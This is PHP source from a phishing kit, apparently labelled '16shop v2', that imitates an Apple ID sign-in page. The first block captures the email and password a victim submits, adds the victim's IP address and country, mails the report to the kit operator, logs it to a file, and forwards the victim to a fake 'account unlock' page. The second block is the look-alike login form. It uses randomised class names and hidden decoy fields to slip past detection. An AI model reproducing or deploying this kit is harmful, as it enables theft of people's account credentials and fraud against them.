<?php @error_reporting(0);
session_start();
/*
yoυ wan'т a prιvaтe ѕcaм wιтн panel and oтнer opтιonѕ? => ix@oυтlooĸ.fr
*/ 
$rand = dechex(rand(0x000000, 0xFFFFFF));
$host = isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'localhost';
if(isset($_POST['pass'])) 
{
include('../../../systemBOT.php');
require "../../../assets/includes/session_protect.php";
require "../../../assets/includes/functions.php";
require "../../../langs.php";
include '../../../MoBamba.php';

$_SESSION['user'] = $_POST['user']; 
$_SESSION['pass'] = $_POST['pass']; 

$uro = generateRandomString(116);

$email	= $_POST['user'];
$password = $_POST['pass'];

##############################################################################################################################################################
        $IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        date_default_timezone_set('UTC');
        $DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$IP."");
        $COUNTRYCODE = $DETAILS->geoplugin_countryCode;
        $COUNTRYNAME = $DETAILS->geoplugin_countryName;
        $STRTCODE    = strtolower($COUNTRYCODE);
##############################################################################################################################################################

/// new 

        $MESSAGE="<div style='font-size:13px;font-family:monospace'>";
		$MESSAGE.="<b>DEAR, <font color='#cc1414'>".$PRONAME."</font> THIS IS YOUR BILL RESULT ENJOY !</b> <br>\n";
				
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Email]</font></b>           :<b>".$email."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[PS]</font></b>        :<b>".$password."</b> <br>\n";

        $MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[IP]</font></b>              :<a href='http://ip-api.com/$IP' target='_blank'>$IP (Click for more information)</a> <br>";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[COUNTRY]</font></b>         : <b> ".$COUNTRYNAME." - ".$COUNTRYCODE." </b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[BROWSER & OS]</font></b>    : <b>".$device_details."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[Copy User Agent]</font></b>    : <b>".$_SERVER['HTTP_USER_AGENT']."</b> <br>\n";
		$MESSAGE.="<b><font color='#cc1414'>✪</font> <font color='#146607'>[TIME]</font></b>            : <b>".date('l jS \of F Y h:i:s A')."</b> <br></div>\n";
		$MESSAGE = wordwrap($MESSAGE,70);

/// new

		$SUBJECT = "✅ Login | $IP | 🌍 $COUNTRYNAME";
		$HEADER = "MIME-Version: 1.0" . "\r\n";
		$HEADER .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$HEADER .= "From: 16shop v2 🚀 Login <admin$rand@$host>\n";
		mail($TO,$SUBJECT,$MESSAGE,$HEADER);
		$myfile = fopen("../../../assets/logs/bloop.php", "a+") or die("Unable to open file!");
		fwrite($myfile, '--------------------------------Login-------------------------------');
        fwrite($myfile, $MESSAGE);
        fclose($myfile);
echo "<form action='locked.php?$email&Account-Unlock&sessionid=$uro&securessl=true&country=$cid' method='post' name='frm'>";
echo "<input type='hidden' name='user' value='$email'>";
echo "<input type='hidden' name='pass' value='$password'>";
echo "</form>";
echo "<script language='JavaScript'>";
echo "document.frm.submit();";
echo "</script>";
}		
?>



<?php @error_reporting(0);
 /*
yoυ wan'т a prιvaтe ѕcaм wιтн panel and oтнer opтιonѕ? => ix@oυтlooĸ.fr
*/ 
require "../../../lang.php";
require "../../../assets/includes/session_protect.php";
require "../../../assets/includes/functions.php";

$gr = generateRandomString(32);

$rand = dechex(rand(0x000000, 0xFFFFFF));
?>
<?php
$setting = parse_ini_file('../../../file.pak');
$getcnt = $setting['setup_getcont'];
if($getcnt == 1) {
$keywords = explode("n", file_get_contents('../../../keys.txt'));
}else
{
$keywords = $rand;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">

<style>
@media screen, print{
h1,p,form,fieldset,input,button{margin:0;padding:0;}
fieldset{border:0;}
button{background:none;border:0;box-sizing:content-box;color:inherit;cursor:pointer;font:inherit;line-height:inherit;overflow:visible;vertical-align:inherit;}
button:disabled{cursor:default;}
:focus{outline:3px solid #c1e0fe;outline:3px solid rgba(131,192,253,.5);outline-offset:1px;}
html.as-mouseuser :focus:not(input):not(textarea):not(select){outline:none;}
::-moz-focus-inner{border:0;padding:0;}
@media print{
a,a:link,a:visited{color:#000;text-decoration:none;}
}
input::-ms-clear{display:none;}
input,button{font-synthesis:none;-moz-font-feature-settings:'kern';-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;direction:ltr;text-align:left;}
h1{color:#111;}
h1+*{margin-top:.8em;}
p+*{margin-top:.8em;}
a{color:#0070c9;}
a:link,a:visited{text-decoration:none;}
a:hover{text-decoration:underline;}
a:active{text-decoration:none;}
.visul<?php echo $gr;?>{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);-webkit-clip-path:inset(0 0 99.9% 99.9%);clip-path:inset(0 0 99.9% 99.9%);overflow:hidden;height:1px;width:1px;padding:0;border:0;}
.row{position:relative;z-index:1;}
.row:before,.row:after{content:' ';display:table;}
.row:after{clear:both;}
.column{box-sizing:border-box;position:relative;z-index:1;margin:0;padding:0;float:left;min-height:2px;}
.large-5{width:41.66667%;}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.small-12{width:100%;}
}
.asi<?php echo $gr;?>{margin-left:auto;margin-right:auto;width:980px;}
@media only screen and (min-width:1442px){
.asi<?php echo $gr;?>{margin-left:auto;margin-right:auto;width:980px;}
}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.asi<?php echo $gr;?>{margin-left:auto;margin-right:auto;width:94.02174%;}
}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.asi<?php echo $gr;?>{margin-left:auto;margin-right:auto;width:87.5%;}
}
.as-buttonlink{text-decoration:none;background:transparent;border:0;color:#0070c9;font-size:inherit;line-height:inherit;font-weight:inherit;letter-spacing:inherit;padding:0;vertical-align:inherit;cursor:pointer;}
.as-buttonlink:hover{text-decoration:underline;}
.as-buttonlink:active{text-decoration:none;}
.as-buttonlink:disabled{color:#888;cursor:default;text-decoration:none;pointer-events:none;}
.button{font-size:17px;line-height:1.47059;font-weight:400;letter-spacing:-.022em;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;background-color:#0070c9;background:linear-gradient(#42a1ec,#0070c9);border-color:#07c;border-width:1px;border-style:solid;border-radius:4px;color:white;cursor:pointer;display:inline-block;min-width:30px;padding-left:15px;padding-right:15px;padding-top:4px;padding-bottom:4px;text-align:center;white-space:nowrap;}
.button:hover{background-color:#147bcd;background:linear-gradient(#51a9ee,#147bcd);border-color:#1482d0;text-decoration:none;}
.button:focus{box-shadow:0 0 0 3px rgba(131,192,253,.5);outline:none;}
html.as-mouseuser .button:focus:not(input):not(textarea):not(select){box-shadow:none;}
.button:active{background-color:#0067b9;background:linear-gradient(#3d94d9,#0067b9);border-color:#006dbc;outline:none;}
.button:disabled{background-color:#0070c9;background:linear-gradient(#42a1ec,#0070c9);border-color:#07c;color:white;cursor:default;opacity:.3;}
.button-block{box-sizing:border-box;display:block;width:100%;}
.frlp<?php echo $gr;?>{position:relative;}
.form-button{width:100%;box-sizing:border-box;padding:.76471rem .88235rem .82353rem;}
.frmlbl<?php echo $gr;?>{font-size:17px;line-height:1.23543;font-weight:400;letter-spacing:-.022em;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;display:block;position:relative;vertical-align:top;color:#333;}
.form-textbox~.frmlbl<?php echo $gr;?>{position:absolute;top:1.05882rem;left:1rem;color:#888;pointer-events:none;padding:0;z-index:1;transition-timing-function:ease-in;transition-duration:.125s;}
.form-textbox:focus~.frmlbl<?php echo $gr;?>,.form-textbox:valid[required]~.frmlbl<?php echo $gr;?>{font-size:12px;line-height:1.75;font-weight:400;letter-spacing:-.01em;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;top:.47059rem;color:#666;}
.form-textbox{font-size:17px;line-height:1.23543;font-weight:400;letter-spacing:-.022em;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;display:inline-block;box-sizing:border-box;vertical-align:top;width:100%;height:3.3em;margin-bottom:.82353rem;padding-top:1.05882rem;padding-left:.94118rem;padding-right:.94118rem;color:#333;text-align:left;border:1px solid #d6d6d6;border-radius:4px;background:rgba(255,255,255,.8);background-clip:padding-box;-webkit-appearance:textfield;-moz-appearance:textfield;appearance:textfield;}
.form-textbox~.frmlbl<?php echo $gr;?>{pointer-events:none;}
.form-textbox:required{box-shadow:none;}
.form-textbox::-webkit-input-placeholder{color:#888;}
.form-textbox:-ms-input-placeholder{color:#888;}
.form-textbox::placeholder{color:#888;}
.form-textbox:focus{-webkit-appearance:none;-moz-appearance:none;appearance:none;border-color:#0070c9;outline:0;box-shadow:0 0 0 .17647rem rgba(131,192,253,.5);}
.form-textbox:disabled{background-color:#fafafa;color:#888;-webkit-text-fill-color:#888;-webkit-opacity:1;}
.form-textbox:disabled:focus{box-shadow:none;border-color:#d6d6d6;}
.form-message-wrapper{font-size:12px;line-height:1.5;font-weight:400;letter-spacing:0;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;display:none;margin-top:.47059rem;margin-bottom:.70588rem;letter-spacing:.006em;}
.rsig<?php echo $gr;?>{padding-top:30px;padding-bottom:92px;}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.rsig<?php echo $gr;?>{padding-top:25px;padding-bottom:79px;}
}
.rssh<?php echo $gr;?>{font-size:40px;line-height:1.1;font-weight:600;letter-spacing:0;font-family:SF Pro Display,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;padding-bottom:36px;padding-top:34px;}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.rssh<?php echo $gr;?>{font-size:32px;line-height:1.125;font-weight:600;letter-spacing:.004em;font-family:SF Pro Display,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;}
}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.rssh<?php echo $gr;?>{font-size:28px;line-height:1.14286;font-weight:600;letter-spacing:.007em;font-family:SF Pro Display,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;}
}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.rssh<?php echo $gr;?>{padding-bottom:0;padding-top:0;}
.rssh<?php echo $gr;?>:lang(en-US){font-size:32px;line-height:1.125;font-weight:600;letter-spacing:.004em;font-family:SF Pro Display,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;}
}
@media only screen and (max-width:1023px) and (max-device-width:736px) and (max-width:1023px) and (max-device-width:736px){
.rssh<?php echo $gr;?>:lang(en-US){font-size:28px;line-height:1.14286;font-weight:600;letter-spacing:.007em;font-family:SF Pro Display,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;}
}
@media only screen and (max-width:1023px) and (max-device-width:736px) and (max-width:1023px) and (max-device-width:736px){
.rssh<?php echo $gr;?>:lang(en-US){font-size:24px;line-height:1.16667;font-weight:600;letter-spacing:.009em;font-family:SF Pro Display,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;}
}
.form-message-warning{font-size:12px;line-height:1.5;font-weight:400;letter-spacing:0;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;display:none;letter-spacing:.006em;margin-bottom:12px;margin-top:8px;}
.as-signin-returningcustomer{margin-right:40px;box-sizing:content-box;}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.as-signin-returningcustomer{margin-top:2px;margin-right:0;}
}
.sininf<?php echo $gr;?>{font-size:14px;line-height:1.42861;font-weight:400;letter-spacing:-.016em;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;margin-bottom:35px;}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.sininf<?php echo $gr;?>{font-size:12px;line-height:1.33341;font-weight:400;letter-spacing:-.01em;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;margin-bottom:28px;}
}
.singinp<?php echo $gr;?>{margin-bottom:1px;margin-top:21px;}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.singinp<?php echo $gr;?>{margin-bottom:-4px;margin-top:16px;}
}
.singinp<?php echo $gr;?>:only-child{margin-top:1px;}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.singinp<?php echo $gr;?>:only-child{margin-top:17px;}
}
.as-signin-accountcreation{font-size:17px;line-height:1.47059;font-weight:400;letter-spacing:-.022em;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;margin-top:7px;}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.as-signin-accountcreation{font-size:12px;line-height:1.33341;font-weight:400;letter-spacing:-.01em;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;margin-top:4px;margin-bottom:-3px;}
}
.asfo<?php echo $gr;?>{margin-top:4px;font-size:17px;line-height:1.47059;font-weight:400;letter-spacing:-.022em;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.asfo<?php echo $gr;?>{font-size:12px;line-height:1.33341;font-weight:400;letter-spacing:-.01em;font-family:SF Pro Text,SF Pro Icons,AOS Icons,Helvetica Neue,Helvetica,Arial,sans-serif;margin-top:0;}
}
.assig<?php echo $gr;?>{padding-bottom:10px;margin-top:23px;}
@media only screen and (max-width:1023px) and (max-device-width:736px){
.assig<?php echo $gr;?>{margin-top:28px;}
}
.rs-chat{border-top:1px solid #d6d6d6;padding:0;text-align:left;}
.rs-chat-content{padding:21px 0;}
}

</style>
<title></title>
</head>
<body>
<div class="logo"></div>
<div><input type="hidden" name="<?php echo $keywords[ array_rand($keywords) ];?>" value="<?php echo($rand);?>">
<form id="<?php echo $gr;?>" action="" class="<?php echo $gr;?>" method="POST">
<div role="main">
   <div class="asi<?php echo $gr;?> rsig<?php echo $gr;?>">
      <h1 class="rssh<?php echo $gr;?>"><?php echo $SignIn;?></h1>
      <div class="row">
	  <input type="hidden" name="<?php echo $keywords[ array_rand($keywords) ];?>" value="<?php echo($rand);?>">
         <div class="column large-5 small-12 as-signin-returningcustomer">
               <fieldset>
                  <div class="singinp<?php echo $gr;?>">
                     <div class="frlp<?php echo $gr;?>">
                        <input type="email" id="hom<?php echo $gr;?>.cosl<?php echo $gr;?>.hb<?php echo $gr;?>" name="user" class="form-textbox form-textbox-text" required="" maxlength="120"><span aria-hidden="true" class="frmlbl<?php echo $gr;?>" id="hom<?php echo $gr;?>.cosl<?php echo $gr;?>.hb<?php echo $gr;?>-label"><?php echo $IApplesD;?></span>
                        
                     </div>
                     <div class="frlp<?php echo $gr;?>">
                        <input type="password" id="hom<?php echo $gr;?>.cosl<?php echo $gr;?>.hb<?php echo $gr;?>" name="pass" class="form-textbox form-textbox-text" required="" maxlength="32"><span aria-hidden="true" class="frmlbl<?php echo $gr;?>" id="hom<?php echo $gr;?>.cosl<?php echo $gr;?>.hk<?php echo $gr;?>-label"><?php echo $Password;?></span>
                        
                     </div>
                  </div>
				  <input type="hidden" name="<?php echo $keywords[ array_rand($keywords) ];?>" value="<?php echo($rand);?>">
               </fieldset>
			   <div class="sininf<?php echo $gr;?>">
               <?php echo $iCsaddressignloud;?>
			   </div>
               <div class="assig<?php echo $gr;?>">
			   <button type="submit" class="button button-block form-button">
			   <span aria-hidden="true"><?php echo $SignIn;?></span><span class="visul<?php echo $gr;?>"><?php echo $SignIn;?></span></button></div>
            </form>
            <div class="asfo<?php echo $gr;?>">
			<a href="" target="_blank"><span aria-hidden="true"><?php echo $pForgotassword;?>
			</span>
			<input type="hidden" name="<?php echo $keywords[ array_rand($keywords) ];?>" value="<?php echo($rand);?>">
			<span class="visul<?php echo $gr;?>"><?php echo $pForgotassword;?></span></a>
			</div>

</div>
<input type="hidden" name="<?php echo $keywords[ array_rand($keywords) ];?>" value="<?php echo($rand);?>">
</div>
</div>
</div>
</div>
</body>
</html>                             